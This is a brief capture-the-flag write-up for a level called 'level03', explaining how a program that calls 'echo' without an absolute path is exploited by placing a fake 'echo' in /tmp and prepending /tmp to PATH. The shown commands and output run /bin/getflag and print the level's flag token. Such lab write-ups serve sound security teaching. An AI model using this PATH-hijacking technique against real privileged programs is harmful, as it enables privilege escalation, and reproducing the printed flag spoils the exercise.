When disasembled, `level03` contains the code in `main.c`  
As we can see, it tries to execute `echo` without absolute path.  
Thus we can replace it by a custom '`echo`' command, containing our payload.  
In that case we try to execute `/bin/getflag`.

```sh
$> echo /bin/getflag > /tmp/echo

$> chmod +x /tmp/echo

$> ./level03
Exploit me

$> PATH=/tmp:$PATH

$> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
